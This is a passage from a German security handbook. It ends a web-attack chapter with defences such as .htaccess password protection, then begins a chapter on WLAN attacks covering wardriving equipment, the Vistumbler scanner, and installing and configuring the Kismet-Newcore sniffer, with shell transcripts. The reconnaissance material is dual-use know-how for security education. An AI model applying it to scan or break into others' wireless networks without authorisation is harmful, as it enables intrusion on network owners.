Stichw\u00f6rtern oder greift gleich zum Metasploit-Framework, das inklusive Manual fast tagesaktuelle Updates unter http://www.metasploit.com kostenfrei verf\u00fcgbar macht. Neben der Konsolenversion, die f\u00fcr Windows-Anwender gewohnt ungewohnt ist, gibt es auch die M\u00f6glichkeit, das Programm \u00fcber einen Webclient zu steuern. Um Redundanzen in der Darstellung zu vermeiden, verweisen wir auf Kapitel 18, wo wir uns detailliert mit den M\u00f6glichkeiten des Metasploit-Frameworks auseinandersetzen. Noch ein Tipp am Rande: Der nicht legitimierte Einsatz eines Vulnerability Scanners auf eine fremde Webseite k\u00f6nnte in K\u00fcrze schon ernsthafte Konsequenzen nach sich ziehen. Aus einer kalkulierten Regelverletzung kann der Gesetzgeber schnell einen relevanten Straftatbestand machen. Normalerweise ist das Scannen von Webservern allerdings nicht a priori mit einem Eindringen in fremde Server oder unbefugtem Aussp\u00e4hen fremder Daten identisch. Allerdings k\u00f6nnen bestimmte Scans z. B. von Eingabeformularen erh\u00f6hten Traffic f\u00fcr den Betroffenen verursachen. Als wir eine unserer eigenen Webseiten scannten, erhielten wir beispielsweise im Laufe eines halben Tages mehr als tausend E-Mails \u00fcber unseren Webserver, die die f\u00fcr die Weiterleitung benutzten EMail-F\u00e4cher recht ordentlich belasteten. Nach dem ersten Schrecken sahen wir die Sache gelassen und haben die betreffenden Formularseiten ge\u00e4ndert. Bei einer fremden Seite h\u00e4tte man das allerdings auch f\u00fcr eine DoS-Attacke halten und entsprechend reagieren k\u00f6nnen.\n15.7\nAbwehrm\u00f6glichkeiten gegen Webattacken\nWie sch\u00fctzt man seine Webseite(n) gegen Attacken? In unserem Fall ist das Gift der Angriffstools zugleich auch das Heilmittel. Alle hier vorgestellten Programme weisen Sicherheitsl\u00fccken und -m\u00e4ngel auf. Allerdings l\u00e4sst sich die Angriffsfl\u00e4che schon um mehr als 90% reduzieren, wenn drei typische Schw\u00e4chen abgestellt werden: \u2022\nAuf dem Webserver laufen ungepatchte Programme.\n\u2022\nDie Programmierung der Webseiten ist fehlerbehaftet.\n\u2022\nDie vorhandenen Sicherheitsmechanismen wie z. B. Passwortabfragen werden nur unzureichend genutzt.\nDie Gefahr, ungepatchte Webserver und -komponenten einzusetzen, trifft vor allem diejenigen Anwender, Privatpersonen und Firmen gleicherma\u00dfen, die eigene Webserver\n15.7 Abwehrm\u00f6glichkeiten gegen Webattacken\n253\nin Betrieb nehmen, ohne regelm\u00e4\u00dfig Updates und Patches aufzuspielen. Wer hier einen professionellen Internet Service-Provider beauftragt und diesen in unregelm\u00e4\u00dfigen Abst\u00e4nden mit einem Audit heimsucht, bleibt von derlei Problemen in der Regel weitgehend verschont. Typische Programmierfehler sowie ungen\u00fcgende Eingabepr\u00fcfungen wiederum erh\u00f6hen die Anf\u00e4lligkeit gegen\u00fcber SQL-Injections und Cross Site Scripting seitens b\u00f6sartiger User. Die meisten dieser Sicherheitsl\u00fccken (so man sie kennt) sind relativ primitiv zu stopfen, oft reicht es, in den entsprechenden Applikationen den HTML-Code an einer Stelle zu \u00e4ndern, z. B. im Inputparameter Sonderzeichen auszufiltern. Etwas mehr Aufwand kostet dagegen das Absichern des Webzugangs selbst. Schlie\u00dflich wird man auch als Web-Hobbyist kein gesteigertes Interesse daran haben, dass fremde User nach Belieben auf die in Heimarbeit erstellte Webseite und ihre Inhalte zugreifen.\n15.7.1 .htaccess sch\u00fctzt vor unbefugtem Zugriff Eine beliebte und relativ sichere Methode, wichtige Daten (z. B. die ftp.ini oder MP3Dateien) auf dem Webserver vor ebenso neugierigen wie unbefugten Augen zu sch\u00fctzen, ist der Einsatz der Konfigurationsdatei .htaccess. Auf NCSA-kompatiblen Webservern (z. B. Apache) sch\u00fctzt diese Datei Ordner und einzelne Dateien vor fremdem Zugriff. Liegt .htaccess in einem Verzeichnis, gelten alle in dieser Datei getroffenen Einschr\u00e4nkungen f\u00fcr dieses und alle darunter liegenden Verzeichnisse. Hauptanwendungsgebiet dieser Dateien ist der Passwortschutz f\u00fcr Webseiten, da eine .htaccess-Datei dem Browerzugriff automatisch entzogen ist und ihre Geheimnisse nicht so schnell preisgibt. Der Aufbau der .htaccess-Datei ist relativ einfach. Meistens findet sich folgender Minimaleintrag: #Kommentarzeile \u2013 Beschreibung der Eintr\u00e4ge AuthUserFile \\\\...\\\\secur\\\\.htpasswd AuthName Hochsicherheitstrakt AuthType Basic require user peter\nDie erste Zeile dient lediglich der Kommentierung und beginnt mit einem #. Zeile 2 zeigt den Namen des zu sch\u00fctzenden Verzeichnisses samt zugeh\u00f6riger Passwortdatei. Zeile 3 legt den Eintrag fest, den der User beim Einloggen zu sehen bekommt, z. B. Enter username and password for \u00bbHochsicherheitstrakt\u00ab. Die Passwortdatei .htpasswd ist ebenfalls eine ASCII-Datei und der vorangestellte Punkt geh\u00f6rt zum Dateinamen. Jede Zeile enth\u00e4lt die Kombination aus User und Passwort, jeweils getrennt durch einen Doppelpunkt.\nBild 15.37: Passwortdatei f\u00fcr .htaccess\n254\nKapitel 15 \u2013 Szenario IV: Web Attack\nDa die Passw\u00f6rter allerdings verschl\u00fcsselt gespeichert werden, brauchen Sie daf\u00fcr noch einen .htaccess-Generator; noch einfacher kann man diese Prozedur \u00fcber http://masterbootrecord.de/docs/htaccess.php393 oder den Htaccess Generator94 abwickeln. Allerdings muss man die erzeugten Eintr\u00e4ge noch in die beiden Dateien .htaccess und .htpasswd integrieren. Dazu \u00f6ffnet man die Kommandoshell unter Windows mit Start / cmd und erzeugt dann mit copy con .htacess bzw. copy con .htpasswd die beiden Dateien. Danach speichern Sie die Datei mit der Tastenkombination (Strg)+(Z) ab. Dieser Weg ist etwas umst\u00e4ndlich, da sich die meisten Editoren weigern, einen Dateinamen mit vorangestelltem Punkt zu erstellen. Hat man diese beiden Dateien erstellt, kopiert man sie \u00fcber FTP in das entsprechende Zielverzeichnis. Die Schutzwirkung setzt sofort ein.\nBild 15.38: Erzeugen von .htaccessund Passwortdatei per Web-Formular\nUnsere spezielle Seite ist jetzt relativ sicher vor fremdem Zugriff. Wenn der User einen Link auf eine gesch\u00fctzte Seite anklickt, greift die Authentifizierung: Nur die Kombination aus Username und Passwort schaltet den Zugriff frei. Was auch funktioniert, ist der Login mit vorangestellter Benutzerkennung + Passwort: http.//peter:meinpasswort@www. meine seite.de.\n93\noder auch: http://domainunion.de/htaccess/htaccess.html\n94\nhttp://www.pc-adviser.de/php/htaccess/htaccess_generator.php\n15.7 Abwehrm\u00f6glichkeiten gegen Webattacken\n255\nEin solcher Aufwand lohnt sich f\u00fcr jedermann \u2013 nicht nur f\u00fcr diejenigen, die professionell genutzte Websites betreiben. Selbst wer keine Shopsysteme, Datenbanken oder Portalanwendungen ins Netz stellen, sondern nur sich und seine Hobbys pr\u00e4sentieren will, ist gut beraten, minimale Sicherheitsstandards einzuhalten. Unzureichend gesch\u00fctzte Seiten k\u00f6nnen erstens durch Defacement verunstaltet werden, was erh\u00f6hten Reparaturaufwand und ein negatives Image zur Folge hat. Und selbst wenn ein Angreifer keine interessanten Daten abgreifen kann, kann er umgekehrt auf dieser Seite unerw\u00fcnschten Payload (Spyware, Trojaner etc.) platzieren oder sie als erweiterte Dateiablage f\u00fcr illegale Inhalte missbrauchen.\n257\n16 Szenario V: WLAN-Attacke Ausgangsszenario: Auf Dr\u00e4ngen Ihrer Familie haben Sie sich f\u00fcr WLAN entschieden; \u00fcber den drahtlosen Internetzugang kann jetzt jedes Familienmitglied bequem im Internet surfen. Ansonsten haben Sie mit dem Thema Netzwerk aber nicht allzu viel am Hut. Eingerichtet hat den WLAN-Zugang ein Arbeitskollege. Einige Tage sp\u00e4ter wundern Sie sich, wie langsam auf einmal die Internetverbindung ist, au\u00dferdem finden Sie merkw\u00fcrdige Dateien auf Ihrem Rechner. Sie k\u00f6nnen sich das nicht erkl\u00e4ren. Dieses Kapitel widmet sich dem Thema Wireless LAN (Wireless Local Area Network, WLAN) und dem damit geschaffenen Bet\u00e4tigungsfeld f\u00fcr wissbegierige Netzwerkforscher, die in Form digitaler Klingelstreiche auf der Suche nach Thrill und Abenteuer sind. M\u00f6glich gemacht wird diese neue Form der sportlichen Freizeitgestaltung f\u00fcr Nerds durch die unz\u00e4hligen Betreiber kabelloser Netzwerke, die aus den verschiedensten Beweggr\u00fcnden heraus der Auffassung sind, es mal ohne Kabel zu versuchen \u2013 und diese Entscheidung im Regelfall beibehalten: sehr zur Begeisterung vieler Mitsurfer in der unmittelbaren Nachbarschaft, die sich von nun an \u00fcber einen kostenlosen Internetzugang erfreuen. Verf\u00fcgt der selbst ernannte Funkdirektor dann nicht \u00fcber eine Flatrate, sondern z. B. \u00fcber einen Volumentarif, kann das schnell ins Geld gehen \u2013 bis hin zu Besuchen der Polizei, wenn urheberrechtlich gesch\u00fctztes Material \u00fcbertragen wird. Weil viele Internet Service-Provider ihre WLAN-Technik zum Dumpingpreis verschleudern, funkt es mittlerweile an jeder Ecke: Ob in der Gro\u00dfstadt oder auf dem platten Land, die Funkwellen bewegen sich gleicherma\u00dfen verteilt bei Firmen, Arztpraxen, Apotheken, Anwaltskanzleien, Kreditinstituten, Bildungstr\u00e4gern, staatlichen Einrichtungen und Privathaushalten durch den \u00c4ther. Die Ende des Jahres 2006 ver\u00f6ffentlichte Feldstudie95 des Informatikers Stefan D\u00f6rh\u00f6fer der RWTH Aachen l\u00e4sst allerdings vermuten, dass viele WLAN-Betreiber mit der Konfiguration der komplexen Ger\u00e4te schlichtweg \u00fcberfordert sind: So lassen Anwender allzu oft simpelste Sicherheitsma\u00dfnahmen au\u00dfer Acht. Einem potenziellen Angreifer wird der digitale Einstieg dadurch ma\u00dflos leicht gemacht. Zu einem \u00e4hnlichen Ergebnis gelangt die bei Unternehmen und Beh\u00f6rden durchgef\u00fchrte Studie96 zur Untersuchung des Einsatzes von WLAN-Sicherheitsma\u00dfnahmen von Daniel Fischer, Dirk Stelzer und Peter Steiert der TU Ilmenau: So res\u00fcmieren die Wissenschaftler, dass vielen Befragungsteilnehmern der Studie etwa g\u00e4ngige Methoden zur Sicherung eines WLAN unbekannt 95\nStefan D\u00f6rh\u00f6fer: Empirische Untersuchungen zur WLAN-Sicherheit mittels Wardriving, http://pi1.informatik.uni-mannheim.de/filepool/theses/diplomarbeit-2006-doerhoefer.pdf\n96\nDaniel Fischer, Dirk Stelzer und Peter Steiert: Untersuchung des Einsatzes von WLAN-Sicherheitsma\u00dfnahmen, http://informationsmanagement.wirtschaft.tu-ilmenau.de/forschung/documents/Einsatzes_ von_WLAN-Sicherheitsmassnahmen_DACH_2006-01-23_Endfassung.pdf\n258\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nseien, somit sicherheitssteigernde Funktionen ungenutzt blieben. Erschreckend dabei ist, dass beispielsweise WLANs in sicherheitskritischen Bereichen nicht durch zus\u00e4tzliche Sicherheitsma\u00dfnahmen gesch\u00fctzter seien als WLANs in weniger kritischen Bereichen \u2013 ein angemessenes Sicherheitsniveau sieht anders aus. Die Feldstudie der RWTH Aachen verzeichnet aber auch einen positiven Trend: Der Anteil der komplett offenen Funknetze ist inzwischen auf weniger als ein Viertel gesunken. Das erscheint grunds\u00e4tzlich als ein Schritt in die richtige Richtung, wurde doch noch im Jahre 2004 bei einer Stichprobenerhebung97 der Zeitschrift c\u2019t ermittelt, dass durchschnittlich mehr als die H\u00e4lfte aller Hot-Spots ohne jegliche Sicherheitsvorkehrungen funken. Grund zur Entwarnung besteht jedoch nicht, da das Wachstum der Funknetze auch weiterhin ungebremst zunimmt und die absolute Zahl der offenen WLANs somit heute sehr viel h\u00f6her liegt als noch vor zwei Jahren. Untermauert wird diese Feststellung durch eine Studie98 der Marktforscher der Dell'Oro Gruppe, die ab dem Jahr 2011 sogar von einer Absatzverdoppelung der f\u00fcr Heimanwender produzierten WLAN-Ger\u00e4te sprechen. Hinzu kommt, dass der mit 60 % gr\u00f6\u00dfte Teil der WLANs nur mit dem unsicheren WEP (Wireless Equivalent Privacy) betrieben wird, dessen Verwundbarkeit durch einen Fehler in der Verschl\u00fcsselung bereits seit dem Jahre 2001 nachgewiesen99 ist. Ein versierter Netzwerkforscher ben\u00f6tigt mittlerweile keine Viertelstunde, um (illegalerweise) WEP zu brechen und sich damit einen Einstieg zum Funknetz zu verschaffen. Die Erkenntnis der Feldstudie der RWTH Aachen deckt sich mit eigenen Untersuchungen der Autoren, die im Auftrag der buw consulting GmbH100 f\u00fcr diverse Publikationen101 in unregelm\u00e4\u00dfigen Abst\u00e4nden die WLAN-Situation vor Ort pr\u00fcfen. Auch hier zeigt sich \u2013 neben einem weiterhin ungebrochenen, rasanten Wachstum funkender HotSpots \u2013 eine zunehmende Verschl\u00fcsselung von Funknetzen, welche jedoch durch den fast ausschlie\u00dflichen Einsatz des leicht brechbaren WEP nur tr\u00fcgerische Sicherheit bieten (dazu sp\u00e4ter mehr). Lediglich bei aktuellen WLAN-Ger\u00e4tschaften, die sich am Standard IEEE 802.11n orientieren, setzt die \u00fcberwiegende Mehrheit den derzeit nur f\u00fcr W\u00f6rterbuchangriffe verwundbaren Sicherheitsstandard Wi-Fi Protected Access 2 (WPA2) ein \u2013 eine grunds\u00e4tzlich erfreuliche Entwicklung, bedeutet dies doch einen nicht unerheblichen Zugewinn an Sicherheit im Heimbereich.\n97\nDaniel Bachfeld: Per Anhalter durchs Internet. Jedes zweite WLAN in Deutschland steht sperrangelweit offen, c\u2019t 13/2004, S. 92\n98\nDell'Oro Group: Wireless LAN quarterly reports, http://www.delloro.com/services_wirelesslan.htm\n99\nFLUHRER, S., MANTIN, I., AND SHAMIR, A.: Weaknesses in the key scheduling algorithm of RC4. Eighth Annual Workshop on Selected Areas in Cryptography (August 2001)\n100\nhttp://www.buw.de/de-neu/technology_consult2.php\n101\nZ. B. Andreas G. Weyert: Schlechte Noten f\u00fcr Betreiber von WLAN-Netzen: Sicherheitsm\u00e4ngel dominieren auch weiterhin, http://www.securitymanager.de/magazin/artikel_2068_wlan_security.html\n16.1 Aufsp\u00fcren von Funknetzen\n16.1\n259\nAufsp\u00fcren von Funknetzen\nMit dem PC oder Notebook ist es leicht, Funknetze ausfindig zu machen: Jedes aktuelle Betriebssystem bietet Werkzeuge zur Anzeige von Hot-Spots und zum Andocken an sowohl unverschl\u00fcsselte als auch verschl\u00fcsselte Funknetze (dann jedoch mit vorheriger Authentifizierung). Geht es dem Leser um die Entdeckung m\u00f6glichst vieler Funknetze (im Fachjargon und je nach Fortbewegungsmittel auch als Wardriving oder Warwalking bezeichnet), bieten sich spezielle Tools an, die wir nun vorstellen m\u00f6chten. Hierbei konzentrieren wir uns wie durchg\u00e4ngig im gesamten Buch auf die jeweils besten ihrer Klassen.\n16.1.1 Hardwareausstattung f\u00fcr Wardriving Welches technische Equipment Sie ben\u00f6tigen, um Hot-Spots aufzusp\u00fcren, lesen Sie im Folgenden. Hierbei fokussieren wir auf die g\u00e4ngige Gattung des mobilen PC-Nomaden mit Notebook. Smartphones wie beispielsweise das iPhone, der Palm Pre oder die Handheld-Kombination eines iPAQ-Pocket-PC mit dem MiniStumbler bleiben au\u00dfen vor. Folgende Zusammenstellung gilt als Klassiker unter den Wardrivern: \u2022\nPKW (idealerweise als Mitfahrer auf dem Beifahrersitz)\n\u2022\nNotebook (mit m\u00f6glichst langer Akkulaufzeit oder Pkw-Stromversorgung)\n\u2022\nNetzwerkkarte mit externem Antennenanschluss und passendem Chipsatz\n\u2022\nRundstrahlantenne mit Magnetfu\u00df (samt Anschlusskabel)\n\u2022\nGPS-Empf\u00e4nger\nBei den Autoren hat sich der Einsatz folgender Komponenten bew\u00e4hrt (ohne damit gleichzeitig eine Produktempfehlung aussprechen zu wollen): \u2022\nNotebook IBM ThinkPad T61, ca. 1500 \u20ac\nBild 16.1: IBM ThinkPad T61\n260\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\n\u2022\nPCMCIA-WLAN-Karte Proxim 8471-WD Orinoco Silver 802.11b/g, ca 60 \u20ac oder\n\u2022\nPCMCIA-WLAN-Karte Atherm WL54AG NEC Atheros 802.11a/b/g, ca 60 \u20ac oder\n\u2022\nUSB-WLAN-Adapter Alfa Network AWUS036H USB 2.0 802.11b/g, ca. 40 \u20ac\nBild 16.2: Proxim 8471-WD Orinoco Silver 802.11b/g mit Atheros-Chipsatz\nBild 16.3: Atherm WL54AG NEC Atheros 802.11a/b/g mit Atheros-Chipsatz\nBild 16.4: Alfa Network AWUS036H USB 2.0 Highpower WLAN Adapter (1000mW)\n16.1 Aufsp\u00fcren von Funknetzen\n\u2022\n261\nRundstrahlantenne mit Magnetfu\u00df (samt Anschlusskabel), ca. 20 \u20ac\nBild 16.5: Rundstrahler/Omni 9-12dBi\n\u2022\nGPS-Receiver HOLUX GPSlim 240 Bluetooth mit SIRF StarIII, ca. 80 \u20ac\nBild 16.6: HOLUX GPSlim 240 GPS Bluetooth\n16.1.2 Vistumbler f\u00fcr Windows Um \u00bbNetStumbler\u00ab (Network Stumbler), den einstigen Shootingstar unter Windows zum Aufsp\u00fcren von Funknetzen, welchen wir in der Erstauflage dieses Buches ausf\u00fchrlich vorstellten, ist es nicht sonderlich gut bestellt. Seit f\u00fcnf Jahren hat das Programm keine Weiterentwicklung mehr erfahren, auch mit der Lauff\u00e4higkeit unter Windows Vista und Windows 7 steht es nicht zum Besten. Ernstzunehmende Nachfolger stellen die WiFi-Scanner Vistumbler102, inSSIDer103 und \u2013 pr\u00e4destiniert f\u00fcr Kurzentschlossene \u2013 Homedale104 dar, wobei wir uns auf das Erstgenannte konzentrieren werden. S\u00e4mtliche Programme beheben das gr\u00f6\u00dfte Manko von Netstumbler, der alle verschl\u00fcsselten WLANs ausschlie\u00dflich mit WEP ausweist, auch wenn diese mit WPA oder WPA2 abgesichert sein sollten. Weitere Vorteile des Vistumblers bestehen \u2013 neben der Unterst\u00fct102\nhttp://www.vistumbler.net\n103\nhttp://www.metageek.net/products/inssider\n104\nhttp://www.computerbild.de/download/homedale-5167924.html\n262\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nzung aktueller Betriebssysteme \u2013 in einer aussagekr\u00e4ftigen Aufzeichnung der St\u00e4rke eingehender WiFi-Signale, einer Filterung der Access Points in einem einfachen Format, der Hervorhebung von Access Points f\u00fcr Bereiche mit hoher WLAN-Konzentration, der Gruppierung der Access Points in verschiedene Kategorien und der M\u00f6glichkeit, entdeckte Access Points samt GPS-Koordinaten sowohl in ein KML-File f\u00fcr Google Earth als auch in anderen Formaten zu exportieren. Mit dem beschriebenen Equipment gestaltet sich die Suche nach Hotspots sehr angenehm, auch wenn Vistumbler \u2013 im direkten Vergleich zum Linux-Programm KismetNewcore, auf das wir sp\u00e4ter eingehen werden \u2013 einige Schw\u00e4chen aufweist. F\u00fcr die Suche nach aktiven Hotspots unter Windows ist das Programm jedoch erste Wahl und gl\u00e4nzt durch eine gelungene Verzahnung mit Google Earth. Die Installation bereitet keine M\u00fchen: das kostenlose Tool aus dem Internet105 laden, installieren, starten, konfigurieren und loslegen. Die Bedienung von Vistumbler ist selbsterkl\u00e4rend: Nach dem Start sucht das Programm nach eingebundenen WLAN-Karten, einem GPSEmpf\u00e4nger und beginnt durch Mausklick auf Scan APs mit der Suche nach Funknetzen. Die zu nutzende WLAN-Karte w\u00e4hlt man im Drop-Down-Men\u00fc Schnittstellen aus. In unserem Fall verwenden wir die eingangs empfohlene PCMCIA-WLAN-Karte ORiNOCO/Proxim 8471-WD, da sich diese um eine externe Antenne erweitern l\u00e4sst und somit unseren Wirkungsgrad erh\u00f6ht.\nBild 16.7: Wahl des WLAN-Adapters\nZur korrekten Einbindung des GPS-Empf\u00e4ngers bedarf es einer Anpassung der Konfiguration unter Einstellungen / GPS Einstellungen, wie die folgende Abbildung veranschaulicht (etwa zur Wahl des richtigen COM-Ports):\n105\nhttp://www.metageek.net/products/inssider/download\n16.1 Aufsp\u00fcren von Funknetzen\n263\nBild 16.8: Konfiguration des GPS-Empf\u00e4ngers\nVistumbler k\u00fcndigt entdeckte Hotspots mit einem akustischen Signal an, sofern unter Optionen der Eintrag Play Sound spielen bei neuen AP ausgew\u00e4hlt ist. Wer es bevorzugt, in Reichweite befindliche Hotspots durch musikalische Untermalung verdeutlicht zu bekommen, sollte unter Einstellungen / Vistumbler Einstellungen / Auto KLM / Akustisches Signal / MIDI die Option MIDI / MIDI Sound abspielen bei aktiven APs aktivieren. Als Folge erklingt ein \u2013 wenn auch fieser \u2013 Signalton, wann immer sich der User im Radius eines Hotspots befindet.\n264\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.9: Akustik beim Entdecken neuer Access Points\nAuf die weiteren vielf\u00e4ltigen M\u00f6glichkeiten des Finetunings verzichten wir hier; diesen Part \u00fcberlassen wir Publikationen, die sich ausschlie\u00dflich der Funknetzforschung unter Windows widmen. Nach der Konfiguration und der ersten Session pr\u00e4sentiert sich Vistumbler \u2013 hier aktiv unterst\u00fctzt durch Google Earth \u2013 in folgendem Gewand:\n16.1 Aufsp\u00fcren von Funknetzen\n265\nBild 16.10: Vistumbler und Google Earth bei der Suche nach Funknetzen\nEntdeckte Funknetze lassen sich unter Export sowohl in eine KML-Datei f\u00fcr Google Earth (Exportieren nach KML) als auch in weitere Formate abspeichern (TXT, VS1, CSV, GPX und NS1). Die M\u00f6glichkeit, entdeckte und per GPS lokalisierte Hotspots anschaulich in einer Karte eintragen zu lassen, verdeutlichen die Autoren in einem Folgekapitel.\nBild 16.11: Speichern der Suchergebnisse in einer Datei\n266\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\n16.1.3 Kismet-Newcore f\u00fcr Linux Kismet-Newcore ist ein extrem leistungsf\u00e4higer passiver WLAN-Sniffer zum Aufsp\u00fcren von Funknetzen, der im Gegensatz zum Vistumbler auch in der Lage ist, versteckte Hotspots zu entdecken. Zugleich handelt es sich bei Kismet-Newcore um den Nachfolger des popul\u00e4ren Kismet, den wir in der letzten Auflage unseres Buches ausf\u00fchrlich vorgestellt hatten, und wurde von Grund auf neu geschrieben. Zu den auff\u00e4lligsten Neuerungen z\u00e4hlen sicherlich die automatische Erkennung des Treibers f\u00fcr die WLANKarte, die ncurse-Oberfl\u00e4che des Clients und die M\u00f6glichkeit der Einbindung zahlreicher Erweiterungen in Form von Plugins. Wir konzentrieren uns im Folgenden auf den Einsatz von Kismet-Newcore unter Linux, auch wenn das Programm mittlerweile f\u00fcr diverse Plattformen verf\u00fcgbar ist. Installation von Kismet-Newcore Die Installation unter Debian GNU/Linux gestaltet sich grunds\u00e4tzlich unkompliziert, obwohl Kismet-Newcore bislang noch keinen Einzug in den \u00bbstable\u00ab Tree von Debian fand und somit ein klein wenig Handarbeit zu leisten ist. Zuallererst ben\u00f6tigen wir das eigentliche Installationsfile, welches sich beispielsweise mittels Wget106 von der Entwicklerwebsite107 laden und anschlie\u00dfend durch Tar108 auspacken l\u00e4sst. root@discordia:~# wget http://www.kismetwireless.net/code/kismet-2009-11R1.tar.gz root@discordia:~# tar xvfz kismet-2009-11-R1.tar.gz kismet-2009-11-R1/ kismet-2009-11-R1/plugintracker.cc kismet-2009-11-R1/popenclient.cc kismet-2009-11-R1/endian_magic.h (...) root@discordia:~#\nBevor wir uns mit der \u00dcbersetzung des Quelltextes von Kismet-Newcore besch\u00e4ftigen, ben\u00f6tigen wir \u2013 neben der GNU Compiler Collection \u2013 noch verschiedene Programmbestandteile auf unserem Rechner, die sich durch Aptitude elegant einbinden lassen.\n106\nhttp://www.gnu.org/software/wget\n107\nhttp://www.kismetwireless.net\n108\nhttp://www.gnu.org/software/tar\n16.1 Aufsp\u00fcren von Funknetzen\n267\nroot@discordia:~# aptitude install build-essential libncurses5-dev libpcap0.8-dev libnl-dev libpcre3-dev Paketlisten werden gelesen... Fertig Abh\u00e4ngigkeitsbaum wird aufgebaut Lese Status-Informationen ein... Fertig Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Lese Task-Beschreibungen... Fertig Die folgenden NEUEN Pakete werden zus\u00e4tzlich installiert: libncurses5-dev libnl-dev libpcap0.8-dev libpcre3-dev libpcrecpp0{a} 0 Pakete aktualisiert, 5 zus\u00e4tzlich installiert, 0 werden entfernt und 146 nicht aktualisiert. Muss 2063kB an Archiven herunterladen. Nach dem Entpacken werden 7967kB zus\u00e4tzlich belegt sein. Wollen Sie fortsetzen? [Y/n/?] Schreibe erweiterte Statusinformationen... Fertig Hole:1 http://ftp.de.debian.org lenny/main libncurses5-dev 5.7+20081213-1 [1546kB] (...) Paketlisten werden gelesen... Fertig Abh\u00e4ngigkeitsbaum wird aufgebaut Lese Status-Informationen ein... Fertig Lese erweiterte Statusinformationen Initialisiere Paketstatus... Fertig Schreibe erweiterte Statusinformationen... Fertig Lese Task-Beschreibungen... Fertig root@discordia:~#\nDie Installation von Kismet-Newcore erfolgt in einem leicht erweiterten Linux-Dreischritt: root@discordia:~# cd kismet-2009-11-R1 root@discordia:~/kismet-2009-11-R1# ./configure checking build system type... i686-pc-linux-gnu checking host system type... i686-pc-linux-gnu checking for gcc... gcc checking for C compiler default output file name... a.out checking whether the C compiler works... yes (...) PPI log format: yes Capability Dropping: no Linux Netlink: yes (mac80211 VAP creation)\n268\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nConfiguration complete.\nRun 'make dep' to generate dependencies\nand 'make' followed by 'make install' to compile and install. root@discordia:~/kismet-2009-11-R1# make dep Makefile:271: .depend: Datei oder Verzeichnis nicht gefunden Generating dependencies... make[1]: Entering directory '/root/kismet-newcore/kismet-2009-11-R1' make[2]: Entering directory '/root/kismet-newcore/kismet-2009-11-R1' make[2]: \".depend\" ist bereits aktualisiert. make[2]: Leaving directory '/root/kismet-newcore/kismet-2009-11-R1' make[1]: Leaving directory '/root/kismet-newcore/kismet-2009-11-R1' root@discordia:~/kismet-2009-11-R1# make g++ -I/usr/include/ncurses -Wall -g -O2 -c util.cc -o util.o g++ -I/usr/include/ncurses -Wall -g -O2 -c cygwin_utils.cc -o cygwin_utils.o g++ -I/usr/include/ncurses -Wall -g -O2 -c ringbuf.cc -o ringbuf.o g++ -I/usr/include/ncurses -Wall -g -O2 -c messagebus.cc -o messagebus.o (...) root@discordia:~/kismet-2009-11-R1# make suidinstall groupadd -f kismet make -e commoninstall make[1]: Entering directory '/root/kismet-newcore/kismet-2009-11-R1' (...) Installed drone config into /usr/local/etc/kismet_drone.conf. Installed kismet into /usr/local/bin/. If you have not done so already, read the README file and the FAQ file. Additional documentation is in the docs/ directory. You MUST edit /usr/local/etc/kismet.conf and configure Kismet for your system, or it will NOT run properly! Kismet has been installed with a SUID ROOT CAPTURE HELPER executeable by users in the group ' kismet '. This WILL ALLOW USERS IN THIS GROUP TO ALTER YOUR NETWORK INTERACE STATES, but is more secure than running all of Kismet as root. ONLY users in this group will be able to run Kismet and capture from physical network devices. root@discordia:~/kismet-2009-11-R1#\nDa wir Kismet-Newcore als SUID ROOT installierten, m\u00fcssen wir abschlie\u00dfend noch unseren Benutzer in die Gruppe Kismet aufnehmen (dieses ist selbstverst\u00e4ndlich nicht erforderlich, wenn die Installation alternativ mit einem make install abgeschlossen wurde). root@discordia:~/kismet-2009-11-R1# adduser andreas kismet F\u00fcge Benutzer \"andreas\" der Gruppe \"kismet\" hinzu ... F\u00fcge Benutzer andreas zu Gruppe kismet hinzu Fertig. root@discordia:~/kismet-2009-11-R1#\n16.1 Aufsp\u00fcren von Funknetzen\n269\nBedienung von Kismet-Newcore Vor einem erfolgreichen Start von Kismet-Newcore haben die G\u00f6tter den Schwei\u00df gestellt: Das Programm muss konfiguriert und an das System angepasst werden. Die f\u00fcr die Konfiguration relevanten Werte finden sich unter Debian GNU/Linux im Verzeichnis /usr/local/etc/ in der Datei kismet.conf, die es mit einem Editor (zum Beispiel dem Editor vi) zu bearbeiten gilt. Nicht ben\u00f6tigte Eintr\u00e4ge sind mit einem Doppelkreuz (#) auszukommentieren. Die wichtigsten zu bearbeitenden Passagen lauten wie folgt: logprefix Zun\u00e4chst bedarf es der Festlegung des Verzeichnisses, in dem Kismet-Newcore Logfiles ablegen soll \u2013 wie beispielsweise die entdeckten Hotspots nebst Geodaten. Standardm\u00e4\u00dfig wird das Verzeichnis verwendet, aus dem Kismet-Newcore heraus gestartet wird. Wir pr\u00e4ferieren eine kultiviertere Form der Ablage: # Prefix of where we log (as used in the logtemplate later) # logprefix=/some/path/to/logs logprefix=/var/log/kismet\nncsource Hier geht es um die korrekte Einbindung der verwendeten WLAN-Karte, zum Beispiel wlan0 oder wlan1. Kismet-Newcore hat in dieser Disziplin im direkten Vergleich zu seinem Vorg\u00e4nger einiges hinzugelernt, erwartete dieser doch noch konkrete Fakten zum Hersteller und dem im Einsatz befindlichen Chipsatz. Die neue automatische Erkennung des Treibers f\u00fcr die WLAN-Karte macht es dem angehenden Wardriver recht leicht: Bei der im ThinkPad T61 verbauten Intel PRO/Wireless 4965AGN (iwl4965) lauten die Einstellungen beispielsweise ncsource=wlan0. Eine Aufz\u00e4hlung der unterst\u00fctzten WLAN-Netzwerkkarten findet sich auf der Kismet-Newcore-Website109. # See the README for full information on the new source format # ncsource=interface:options # for example: # ncsource=wlan0 # ncsource=wifi0:type=madwifi # ncsource=wlan0:name=intel,hop=false,channel=11 ncsource=wlan0\n109\nhttp://www.kismetwireless.net/documentation.shtml\n270\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\ngps / gpsdevice Kismet-Newcore hat GPS in der Standardeinstellung bereits aktiviert, lediglich das GPSDevice ist noch individuell zu bestimmen. # Do we have a GPS? gps=true # Do we use a locally serial attached GPS, or use a gpsd server? # (Pick only one) gpstype=gpsd # gpstype=serial # What serial device do we look for the GPS on? # gpsdevice=/dev/rfcomm0 